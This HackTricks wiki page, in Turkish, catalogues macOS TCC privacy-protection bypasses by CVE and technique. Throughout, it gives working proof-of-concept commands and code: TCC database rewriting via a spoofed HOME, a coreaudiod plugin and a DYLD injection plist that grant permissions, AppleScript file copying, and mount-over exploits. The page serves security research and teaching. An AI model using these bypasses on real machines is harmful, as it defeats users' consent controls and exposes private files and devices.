# macOS TCC Bypass'leri

{{#include ../../../../../banners/hacktricks-training.md}}

## İşlevselliğe göre

### Write Bypass

Bu bir bypass değildir; yalnızca TCC'nin çalışma şeklidir: **Yazmaya karşı koruma sağlamaz**. Terminal'in **bir kullanıcının Desktop'ını okuma erişimi yoksa bile Desktop'a yazabilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`**, **creators app**'e dosyayı okuma erişimi vermek için yeni **file**'a eklenir.

### TCC ClickJacking

Kullanıcının fark etmeden **kabul etmesini** sağlamak için **TCC prompt'unun üzerine bir pencere yerleştirmek** mümkündür. PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** içinde bulabilirsiniz.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker, **`Info.plist`** içinde **herhangi bir isimle** (ör. Finder, Google Chrome...) **apps oluşturabilir** ve bu app'lerin TCC tarafından korunan bir konuma erişim istemesini sağlayabilir. Kullanıcı, bu erişimi isteyenin meşru uygulama olduğunu düşünecektir.\
Ayrıca, **meşru app'i Dock'tan kaldırıp sahte olanı Dock'a eklemek** mümkündür. Böylece kullanıcı, aynı simgeyi kullanabilen sahte app'e tıkladığında bu app meşru olanı çağırabilir, TCC permissions isteyebilir ve bir malware çalıştırabilir; kullanıcı da erişimi meşru app'in istediğine inanır.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Varsayılan olarak **SSH üzerinden erişim "Full Disk Access" yetkisine sahipti**. Bunu devre dışı bırakmak için SSH'nin listede bulunması, ancak devre dışı bırakılmış olması gerekir (listeden kaldırmak bu yetkileri kaldırmaz):

![TCC Request by arbitrary name - SSH Bypass: Varsayılan olarak SSH üzerinden erişim "Full Disk Access" yetkisine sahipti. Bunu devre dışı bırakmak için listede bulunması, ancak devre dışı bırakılmış olması gerekir (listeden kaldırmak...](<../../../../../images/image (1077).png>)

Burada bazı **malware'lerin bu korumayı nasıl bypass edebildiğine** dair örnekleri bulabilirsiniz:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> SSH'yi etkinleştirebilmek için artık **Full Disk Access** gerektiğini unutmayın.

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** niteliği, **belirli bir uygulamaya dosyayı okuma permissions'ı vermek** için dosyalara atanır. Bu nitelik, bir dosya **drag\&drop** ile bir app'in üzerine bırakıldığında veya kullanıcı bir dosyayı açmak için **default application ile açmak üzere çift tıkladığında** ayarlanır.

Dolayısıyla bir kullanıcı, tüm extensions'ları işlemek üzere **malicious app register edebilir** ve herhangi bir dosyayı **open** etmek için Launch Services'i çağırabilir (böylece malicious file'a dosyayı okuma erişimi verilir).

### iCloud

**`com.apple.private.icloud-account-access`** entitlement'ı ile **`com.apple.iCloudHelper`** XPC service'ine iletişim kurmak ve **iCloud token'ları almak** mümkündür.

**iMovie** ve **Garageband** bu entitlement'a ve buna izin veren diğer entitlement'lara sahipti.

Bu entitlement kullanılarak **iCloud token'larını alma** exploit'i hakkında daha fazla **bilgi** için şu konuşmaya bakın: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission'ına sahip bir app, **diğer Apps'leri kontrol edebilir**. Bu, **diğer Apps'lere verilen permissions'ları abuse edebileceği** anlamına gelir.

Apple Scripts hakkında daha fazla bilgi için:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Örneğin bir App'in **`iTerm` üzerinde Automation permission'ı** varsa, bu örnekte olduğu gibi **`Terminal` iTerm üzerinde erişime** sahiptir:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA'ya sahip olmayan Terminal, iTerm'i çağırabilir; iTerm FDA'ya sahip olduğundan Terminal, iTerm'i kullanarak işlemler gerçekleştirebilir:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder Üzerinden

Ya da bir App'in Finder üzerinden erişimi varsa, bu script gibi bir şey olabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Uygulama Davranışına Göre

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Userland **tccd daemon**, TCC kullanıcı veritabanına şu konumdan erişmek için **`HOME`** **env** değişkenini kullanıyordu: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) uyarınca ve TCC daemon'ı mevcut kullanıcının domain'i içinde `launchd` aracılığıyla çalıştığından, kendisine aktarılan **tüm environment variable**'ları **kontrol etmek** mümkündür.\
Böylece bir **attacker**, **`launchctl`** içinde **`$HOME` environment** değişkenini **kontrolündeki** bir **directory**'yi gösterecek şekilde ayarlayabilir, **TCC** daemon'ını yeniden başlatabilir ve ardından son kullanıcıya hiçbir zaman prompt gösterilmeden kendisine kullanılabilir **tüm TCC entitlement**'larını vermek için **TCC database**'ini doğrudan değiştirebilir.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes, TCC korumalı konumlara erişebiliyordu; ancak bir note oluşturulduğunda bu **korumasız bir konumda oluşturulur**. Böylece Notes'tan korumalı bir dosyayı bir note'a (yani korumasız bir konuma) kopyalamasını isteyebilir ve ardından dosyaya erişebilirdiniz:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` kütüphanesine sahip `/usr/libexec/lsd` binary'si, **nullfs** mount oluşturmasına izin veren `com.apple.private.nullfs_allow` entitlement'ına ve her dosyaya erişmek için **`kTCCServiceSystemPolicyAllFiles`** içeren `com.apple.private.tcc.allow` entitlement'ına sahipti.

"Library"ye quarantine attribute eklemek, **`com.apple.security.translocation`** XPC service'ini çağırmak ve ardından Library'yi, Library içindeki tüm dokümanların **erişilebildiği** **`$TMPDIR/AppTranslocation/d/d/Library`** konumuna map etmek mümkündü.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ilginç bir özelliğe sahiptir: Çalışırken **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** konumuna bırakılan dosyaları kullanıcının "media library"si içine **import** eder. Ayrıca `a` ve `b` değerlerinin şunlar olduğu **`rename(a, b);`** benzeri bir işlem çağırır:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Bu **`rename(a, b);`** davranışı bir **Race Condition**'a karşı savunmasızdır; çünkü `Automatically Add to Music.localized` klasörünün içine sahte bir **TCC.db** dosyası yerleştirmek ve ardından yeni klasör (b) oluşturulup dosya kopyalandığında dosyayı silip **`~/Library/Application Support/com.apple.TCC`**/ konumuna işaret ettirmek mümkündür.
**Daha fazla bilgi** [**writeup'ta**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)

### SQLITE_SQLLOG_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="path/folder"`** temelde **açılan herhangi bir db'nin bu path'e kopyalanacağı** anlamına gelir. Bu CVE'de bu kontrol, **FDA'ya sahip bir process tarafından açılacak bir SQLite database'in içine yazmak** için kötüye kullanıldı; ardından database **açıldığında** kullanıcının **TCC.db** dosyasının açılan dosyayla üzerine yazılması için dosya adında bir **symlink** ile **`SQLITE_SQLLOG_DIR`** kötüye kullanıldı.\
**Daha fazla bilgi** [**writeup'ta**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **ve**[ **talk'ta**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

**`SQLITE_AUTO_TRACE`** environment variable'ı ayarlanırsa **`libsqlite3.dylib`** library'si tüm SQL query'lerini **loglamaya** başlar. Birçok application bu library'yi kullandığından, tüm SQLite query'lerini loglamak mümkündü.

Bazı Apple application'ları TCC korumalı bilgilere erişmek için bu library'yi kullanıyordu.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Bu **env variable, `Metal` framework tarafından kullanılır** ve başta FDA'ya sahip olan `Music` olmak üzere çeşitli programların dependency'sidir.

Şunu ayarlamak: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Eğer `path` geçerli bir directory ise bug tetiklenir ve programda neler olduğunu görmek için `fs_usage` kullanabiliriz:

- `path/.dat.nosyncXXXX.XXXXXX` adında bir file `open()` edilir (X rastgeledir)
- file'ın içeriğine bir veya daha fazla `write()` işlemi yapılır (bunu kontrol edemeyiz)
- `path/.dat.nosyncXXXX.XXXXXX`, `path/name` olarak `renamed()` edilir

Bu, geçici bir file write işlemidir ve ardından **güvenli olmayan bir `rename(old, new)`** gerçekleşir.

Güvenli değildir, çünkü old ve new path'lerini **ayrı ayrı resolve etmesi gerekir**; bu işlem zaman alabilir ve bir Race Condition'a karşı savunmasız olabilir. Daha fazla bilgi için `xnu` içindeki `renameat_internal()` function'ına bakabilirsiniz.

> [!CAUTION]
> Yani temel olarak, eğer privileged bir process sizin kontrol ettiğiniz bir folder'dan rename yapıyorsa bir RCE kazanabilir ve farklı bir file'a erişmesini sağlayabilir veya bu CVE'de olduğu gibi privileged app'in oluşturduğu file'ı açıp bir FD saklamasını sağlayabilirsiniz.
>
> Rename işlemi sizin kontrol ettiğiniz bir folder'a erişiyorsa, source file'ı değiştirmişken veya ona ait bir FD'ye sahipken destination file'ı (veya folder'ı) bir symlink'i gösterecek şekilde değiştirirsiniz; böylece istediğiniz zaman write yapabilirsiniz.

CVE'deki attack buydu: Örneğin kullanıcının `TCC.db` file'ını overwrite etmek için şunları yapabiliriz:

- `/Users/hacker/ourlink` path'ini `/Users/hacker/Library/Application Support/com.apple.TCC/` path'ini gösterecek şekilde oluşturmak
- `/Users/hacker/tmp/` directory'sini oluşturmak
- `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` değerini ayarlamak
- bu env variable ile `Music` çalıştırarak bug'ı tetiklemek
- `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` file'ının `open()` edilmesini yakalamak (X rastgeledir)
- burada bu file'ı writing amacıyla ayrıca `open()` eder ve file descriptor'ı açık tutarız
- `/Users/hacker/tmp` ile `/Users/hacker/ourlink` path'lerini **bir loop içinde** atomically değiştirmek
- bunu, race window oldukça dar olduğu için başarılı olma ihtimalimizi artırmak amacıyla yaparız; ancak race'i kaybetmenin dezavantajı yok denecek kadar azdır
- biraz beklemek
- başarılı olup olmadığımızı test etmek
- başarılı olmadıysak baştan tekrar çalıştırmak

Daha fazla bilgi için [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Şimdi, `MTL_DUMP_PIPELINES_TO_JSON_FILE` env variable'ını kullanmayı denerseniz uygulamalar launch olmaz

### Apple Remote Desktop

root olarak bu service'i enable edebilirsiniz; böylece **ARD agent full disk access'e sahip olur** ve bir user tarafından yeni bir **TCC user database** kopyalaması için abuse edilebilir.

## By **NFSHomeDirectory**

TCC, user'a özel resource'lara erişimi kontrol etmek için user'ın HOME folder'ında şu path'te bir database kullanır: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Bu nedenle user, `$HOME` env variable'ı **farklı bir folder'ı** gösterecek şekilde TCC'yi restart etmeyi başarırsa, **/Library/Application Support/com.apple.TCC/TCC.db** içinde yeni bir TCC database oluşturabilir ve TCC'yi herhangi bir app'e herhangi bir TCC permission vermesi için kandırabilir.

> [!TIP]
> Apple'ın **`NFSHomeDirectory`** attribute'unda user profile'ı içinde saklanan ayarı **`$HOME` değeri** olarak kullandığını unutmayın; dolayısıyla bu değeri değiştirme permission'ına (**`kTCCServiceSystemPolicySysAdminFiles`**) sahip bir application'ı compromise ederseniz, bu seçeneği bir TCC bypass ile **weaponize** edebilirsiniz.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, user'ın **HOME** folder'ını değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.

1. Target app için bir _csreq_ blob'u alın.
2. Gerekli access ve _csreq_ blob'unu içeren sahte bir _TCC.db_ file'ı yerleştirin.
3. User'ın Directory Services entry'sini [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile export edin.
4. User'ın home directory'sini değiştirmek için Directory Services entry'sini modify edin.
5. Modify edilmiş Directory Services entry'sini [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile import edin.
6. User'ın _tccd_'sini stop edin ve process'i reboot edin.

İkinci POC, `kTCCServiceSystemPolicySysAdminFiles` değerine sahip `com.apple.private.tcc.allow` entitlement'ı bulunan **`/usr/libexec/configd`**'yi kullandı.\
`configd`'yi **`-t`** option'ı ile çalıştırmak mümkündü; bir attacker **load edilecek custom Bundle** belirtebilirdi. Bu nedenle exploit, user'ın home directory'sini değiştirmek için kullanılan **`dsexport`** ve **`dsimport`** method'larını bir **`configd` code injection** ile **değiştirir**.

Daha fazla bilgi için [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)'a bakın.

## By process injection

Bir process içine code inject etmek ve TCC privilege'larını abuse etmek için farklı teknikler vardır:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ayrıca, TCC bypass için bulunan en yaygın process injection, **plugins (load library)** üzerinden gerçekleşir.\
Plugin'ler genellikle library'ler veya plist'ler biçimindeki ekstra code'dur; **main application tarafından load edilir** ve onun context'i altında execute edilir. Bu nedenle main application'ın TCC restricted file'larına erişimi varsa (granted permission'lar veya entitlement'lar aracılığıyla), **custom code da aynı erişime sahip olur**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application'ı **`kTCCServiceSystemPolicySysAdminFiles`** entitlement'ına sahipti, **`.daplug`** extension'ına sahip plugin'leri load ediyordu ve hardened runtime'a sahip **değildi**.

Bu CVE'yi weaponize etmek için, TCC'yi bypass etmek amacıyla user'ların TCC database'lerini **take over** edebilmek üzere (önceki entitlement abuse edilerek) **`NFSHomeDirectory` değiştirilir**.

Daha fazla bilgi için [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)'a bakın.

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary'si `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` entitlement'larına sahipti. İlki **code injection'a izin veriyor**, ikincisi ise ona **TCC'yi manage etme** access'i veriyordu.

Bu binary, `/Library/Audio/Plug-Ins/HAL` folder'ından **third party plug-in'leri** load edebiliyordu. Bu nedenle şu POC ile **bir plugin load edip TCC permission'larını abuse etmek** mümkündü:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O üzerinden kamera akışını açan system uygulamaları (**`kTCCServiceCamera`** içeren uygulamalar), `/Library/CoreMediaIO/Plug-Ins/DAL` konumunda bulunan bu plugin'leri (SIP tarafından kısıtlanmamıştır) **process içinde** yükler.

Oraya yalnızca yaygın **constructor** içeren bir library yerleştirmek **code injection** için yeterlidir.

Birkaç Apple uygulaması buna karşı savunmasızdı.

### Firefox

Firefox uygulamasında `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` entitlements bulunuyordu:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Bu konunun nasıl kolayca exploit edilebileceği hakkında daha fazla bilgi için [**orijinal raporu inceleyin**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` binary'si **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** entitlements'larına sahipti; bu da process'in içine code inject edilmesine ve TCC privileges'larının kullanılmasına olanak tanıyordu.

### CVE-2023-26818 - Telegram

Telegram, **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** entitlements'larına sahipti; bu nedenle camera ile recording yapmak gibi **permissions'larına erişim sağlamak** için abuse edilmesi mümkündü. [**Payload'ı writeup'ta bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Bir library yüklemek için env variable'ın nasıl kullanıldığına dikkat edin; bu library'yi inject etmek amacıyla bir **custom plist** oluşturuldu ve bunu başlatmak için **`launchctl`** kullanıldı:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## `open` çağrılarıyla

**sandboxed** durumdayken bile **`open`** çağrısı yapmak mümkündür.

### Terminal Scripts

Özellikle teknik kişiler tarafından kullanılan bilgisayarlarda, **Terminal**'e **Full Disk Access (FDA)** vermek oldukça yaygındır. Bununla birlikte **`.terminal`** script'lerini çağırmak mümkündür.

**`.terminal`** script'leri, çalıştırılacak komutun **`CommandString`** anahtarında bulunduğu aşağıdakine benzer plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama /tmp gibi bir konuma bir terminal script'i yazabilir ve onu şu tür bir komutla çalıştırabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Herhangi bir kullanıcı** (yetkisi olmayanlar bile) bir time machine snapshot'ı oluşturup mount edebilir ve bu snapshot'taki **TÜM dosyalara erişebilir**.\
Gerekli olan **tek ayrıcalık**, kullanılan uygulamanın (örneğin `Terminal`) bir yönetici tarafından verilmesi gereken **Full Disk Access** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - TCC dosyasının üzerine mount etme

TCC DB dosyası korunuyor olsa bile, dizinin üzerine yeni bir TCC.db dosyası **mount etmek** mümkündü:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)'ta açıklandığı üzere bu CVE, `diskarbitrationd`'yi kötüye kullanıyordu.

Public `DiskArbitration` framework'ündeki `DADiskMountWithArgumentsCommon` işlevi güvenlik kontrollerini gerçekleştiriyordu. Ancak doğrudan `diskarbitrationd` çağrılarak bu kontrolleri bypass etmek ve bu nedenle path içinde `../` öğeleri ile symlink'ler kullanmak mümkündü.

Bu durum, `diskarbitrationd`'nin `com.apple.private.security.storage-exempt.heritable` entitlement'ı nedeniyle TCC database üzerine mount etmek de dahil olmak üzere herhangi bir konumda arbitrary mount işlemleri gerçekleştirilmesine olanak sağladı.

### asr

**`/usr/sbin/asr`** tool'u, tüm diski kopyalamaya ve TCC protections'ı bypass ederek başka bir konuma mount etmeye olanak sağlıyordu.

### Location Services

**location services'a erişmesine** izin verilen client'ları belirtmek için üçüncü bir TCC database, **`/var/db/locationd/clients.plist`**, bulunur.\
**`/var/db/locationd/` klasörü DMG mounting işlemine karşı korunmuyordu**, dolayısıyla kendi plist'imizi mount etmek mümkündü.

## Başlangıç uygulamalarıyla


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep ile

Bazı durumlarda dosyalar e-posta adresleri, telefon numaraları, mesajlar... gibi sensitive information'ı protected olmayan konumlarda depolar (Apple'a göre bu durum vulnerability sayılır).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Bu artık çalışmıyor, ancak [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) kullanmanın başka bir yolu:

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
